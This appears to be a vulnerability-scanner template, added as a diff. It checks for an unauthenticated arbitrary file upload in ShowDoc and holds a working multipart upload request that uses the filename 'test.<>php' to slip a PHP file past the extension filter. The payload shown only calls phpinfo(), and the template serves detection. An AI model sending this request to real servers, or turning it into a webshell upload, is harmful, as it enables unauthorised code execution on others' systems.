@@ -1,0 +1,39 @@
+app: ShowDoc
+query: body:"ShowDoc"
+meta:
+  name: ShowDoc 任意文件上传漏洞
+  level: 4
+  tags:
+    - file_upload
+    - ultra_vires
+  description: |-
+    Server \ Application \ Home \ Controller \ PageController.class.php第150行
+    $upload->allowExts = array('jpg', 'gif', 'png', 'jpeg');// 设置附件上传类型
+    $ upload-> allowExts不是思考\ Upload类的正确用法，导致文件后缀限制无效
+    并且方法里面没有进行$ this-> checkLogin（）；导致未登录上传文件，即前台gethell
+  homepage: https://www.showdoc.com.cn/
+  author: 一曲成殇
+  references: https://www.adminxe.com/2317.html
+  solution: 更新系统
+  steps:
+    verify_steps:
+      type: and
+      verify:
+        - request:
+            method: POST
+            path: /index.php?s=/home/page/uploadImg
+            redirect: true
+            header:
+              - Content-Type: 'multipart/form-data; boundary=--------------------------921378126371623762173617'
+            params: |-
+              ----------------------------921378126371623762173617
+              Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"
+              Content-Type: text/plain
+
+              <?php phpinfo();?>
+              ----------------------------921378126371623762173617--
+          response:
+            - name: body
+              value: ".php\",\"success\":1"
+              type: contains
+  create_at: "2021-11-22 17:11:15"
